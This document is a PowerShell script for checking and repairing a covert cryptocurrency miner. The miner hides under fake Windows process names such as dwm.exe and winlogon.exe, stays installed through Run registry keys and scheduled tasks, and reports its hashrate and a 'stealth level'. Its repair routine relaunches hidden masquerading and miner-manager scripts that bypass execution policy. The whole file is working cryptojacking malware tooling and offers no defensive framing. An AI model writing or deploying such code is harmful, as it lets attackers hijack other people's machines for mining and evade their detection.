# Stealth Miner Status Check & Repair System
# Monitors all disguised miner processes and repairs if needed

param(
    [switch]$Repair
)

$ErrorActionPreference = "SilentlyContinue"

# Stealth process definitions
$StealthProcesses = @{
    "audiodg.exe" = @{
        Description = "Windows Audio Device Graph Isolation"
        Location = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv"
        Expected = $true
    }
    "AudioSrv.exe" = @{
        Description = "Windows Audio Service"
        Location = "C:\ProgramData\Microsoft\Windows\WindowsUpdate"
        Expected = $true
    }
    "dwm.exe" = @{
        Description = "Desktop Window Manager"
        Location = "C:\ProgramData\Microsoft\Network\Downloader"
        Expected = $true
    }
    "winlogon.exe" = @{
        Description = "Windows Logon Application"
        Location = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
        Expected = $true
    }
}

function Write-StatusLog {
    param([string]$Message, [string]$Type = "INFO")
    $timestamp = Get-Date -Format "HH:mm:ss"
    $color = switch($Type) {
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        "ERROR" { "Red" }
        default { "White" }
    }
    Write-Host "[$timestamp] $Message" -ForegroundColor $color
}

function Test-StealthMinerStatus {
    Write-StatusLog "🔍 Checking stealth miner deployment..." "INFO"
    $statusReport = @{
        ProcessesFound = 0
        ProcessesRunning = 0
        FilesPresent = 0
        TasksActive = 0
        RegistryEntries = 0
        TotalHashrate = 0
    }
    
    foreach ($processName in $StealthProcesses.Keys) {
        $processInfo = $StealthProcesses[$processName]
        $processPath = Join-Path $processInfo.Location $processName
        $configPath = Join-Path $processInfo.Location "config.json"
        
        # Check if files exist
        if (Test-Path $processPath) {
            $statusReport.FilesPresent++
            Write-StatusLog "✅ Found: $processName at $($processInfo.Location)" "SUCCESS"
            
            # Check if process is running
            $runningProcess = Get-Process -Name $processName.Replace(".exe", "") -ErrorAction SilentlyContinue
            if ($runningProcess) {
                $statusReport.ProcessesRunning++
                Write-StatusLog "🏃 Running: $processName (PID: $($runningProcess.Id))" "SUCCESS"
                
                # Try to get hashrate via API (different port for each instance)
                $apiPort = 16000 + $statusReport.ProcessesRunning
                try {
                    $api = Invoke-RestMethod -Uri "http://127.0.0.1:$apiPort/1/summary" -TimeoutSec 2
                    if ($api.hashrate.total -and $api.hashrate.total[0] -gt 0) {
                        $hashrate = [math]::Round($api.hashrate.total[0], 0)
                        $statusReport.TotalHashrate += $hashrate
                        Write-StatusLog "⚡ Hashrate: $hashrate H/s" "SUCCESS"
                    }
                } catch { }
            } else {
                Write-StatusLog "⚠️ Not running: $processName" "WARNING"
            }
        } else {
            Write-StatusLog "❌ Missing: $processName at $($processInfo.Location)" "ERROR"
        }
        
        $statusReport.ProcessesFound++
    }
    
    # Check scheduled tasks
    $taskCount = 0
    $taskNames = @("WindowsAudioDeviceGraphIsolation", "WindowsAudioService", "DesktopWindowManager", "WindowsLogonApplication")
    foreach ($taskName in $taskNames) {
        $task = schtasks /query /tn $taskName 2>&1 | Out-String
        if ($task -notmatch "ERROR") {
            $taskCount++
        }
    }
    $statusReport.TasksActive = $taskCount
    
    # Check registry entries
    $regCount = 0
    $regPaths = @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    foreach ($regPath in $regPaths) {
        try {
            $entries = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
            foreach ($processName in $StealthProcesses.Keys) {
                $processInfo = $StealthProcesses[$processName]
                if ($entries."$($processInfo.Description)") {
                    $regCount++
                }
            }
        } catch { }
    }
    $statusReport.RegistryEntries = $regCount
    
    return $statusReport
}

function Repair-StealthMiner {
    Write-StatusLog "🔧 Starting stealth miner repair..." "INFO"
    
    # Run process masquerading installation
    $masqueradingScript = Join-Path $PSScriptRoot "process_masquerading.ps1"
    if (Test-Path $masqueradingScript) {
        Write-StatusLog "🛠️ Deploying stealth processes..." "INFO"
        powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $masqueradingScript -Install
        Start-Sleep -Seconds 5
    }
    
    # Start universal miner manager
    $universalManager = Join-Path $PSScriptRoot "universal_miner_manager.ps1"
    if (Test-Path $universalManager) {
        Write-StatusLog "🚀 Starting universal miner..." "INFO"
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$universalManager`" -Start" -WindowStyle Hidden
        Start-Sleep -Seconds 3
    }
    
    Write-StatusLog "🔧 Repair process completed" "SUCCESS"
}

function Show-StatusSummary {
    param([hashtable]$Status)
    
    Write-Host ""
    Write-Host "===============================================" -ForegroundColor Cyan
    Write-Host "       STEALTH MINER STATUS REPORT" -ForegroundColor Cyan
    Write-Host "===============================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Overall status
    $overallStatus = if ($Status.ProcessesRunning -gt 0) { "🟢 ACTIVE" } else { "🔴 INACTIVE" }
    Write-Host "📊 Overall Status: $overallStatus" -ForegroundColor $(if ($Status.ProcessesRunning -gt 0) { "Green" } else { "Red" })
    Write-Host ""
    
    # Detailed metrics
    Write-Host "🔍 Deployment Status:" -ForegroundColor Yellow
    Write-Host "   • Files Present: $($Status.FilesPresent)/4 stealth processes" -ForegroundColor White
    Write-Host "   • Active Processes: $($Status.ProcessesRunning)/4 running" -ForegroundColor White
    Write-Host "   • Scheduled Tasks: $($Status.TasksActive) active" -ForegroundColor White
    Write-Host "   • Registry Entries: $($Status.RegistryEntries) configured" -ForegroundColor White
    Write-Host ""
    
    # Performance metrics
    if ($Status.TotalHashrate -gt 0) {
        $hashrateKH = [math]::Round($Status.TotalHashrate / 1000, 2)
        Write-Host "⚡ Mining Performance:" -ForegroundColor Yellow
        Write-Host "   • Total Hashrate: $hashrateKH KH/s" -ForegroundColor Green
        Write-Host "   • Expected Range: 5.0-5.5 KH/s" -ForegroundColor White
        $performance = if ($hashrateKH -ge 5.0) { "Excellent" } elseif ($hashrateKH -ge 4.0) { "Good" } else { "Needs Attention" }
        Write-Host "   • Performance: $performance" -ForegroundColor $(if ($hashrateKH -ge 5.0) { "Green" } elseif ($hashrateKH -ge 4.0) { "Yellow" } else { "Red" })
    } else {
        Write-Host "⚠️  No hashrate data available" -ForegroundColor Yellow
    }
    Write-Host ""
    
    # Stealth assessment
    $stealthLevel = "Unknown"
    $stealthColor = "White"
    if ($Status.ProcessesRunning -eq 4 -and $Status.TasksActive -ge 4 -and $Status.RegistryEntries -ge 4) {
        $stealthLevel = "🥷 MAXIMUM STEALTH"
        $stealthColor = "Green"
    } elseif ($Status.ProcessesRunning -ge 2) {
        $stealthLevel = "🔒 GOOD STEALTH"
        $stealthColor = "Yellow"
    } elseif ($Status.ProcessesRunning -ge 1) {
        $stealthLevel = "⚠️ BASIC STEALTH"
        $stealthColor = "Yellow"
    } else {
        $stealthLevel = "🚨 NO STEALTH"
        $stealthColor = "Red"
    }
    
    Write-Host "🥷 Stealth Assessment: $stealthLevel" -ForegroundColor $stealthColor
    Write-Host ""
    
    # Process list
    Write-Host "📋 Active Stealth Processes:" -ForegroundColor Yellow
    foreach ($processName in $StealthProcesses.Keys) {
        $processInfo = $StealthProcesses[$processName]
        $runningProcess = Get-Process -Name $processName.Replace(".exe", "") -ErrorAction SilentlyContinue
        $status = if ($runningProcess) { "✅ Running" } else { "❌ Stopped" }
        $color = if ($runningProcess) { "Green" } else { "Red" }
        Write-Host "   • $processName - $($processInfo.Description) - $status" -ForegroundColor $color
    }
    
    Write-Host ""
    Write-Host "===============================================" -ForegroundColor Cyan
}

# Main execution
Write-Host ""
Write-Host "🔍 STEALTH MINER STATUS CHECK" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

$currentStatus = Test-StealthMinerStatus

Show-StatusSummary -Status $currentStatus

if ($Repair -and $currentStatus.ProcessesRunning -lt 2) {
    Write-Host ""
    Write-StatusLog "🔧 Auto-repair triggered due to low process count..." "WARNING"
    Repair-StealthMiner
    
    Write-Host ""
    Write-StatusLog "🔄 Re-checking status after repair..." "INFO"
    Start-Sleep -Seconds 10
    $newStatus = Test-StealthMinerStatus
    Show-StatusSummary -Status $newStatus
}

Write-Host ""
Write-StatusLog "✅ Status check completed" "SUCCESS"
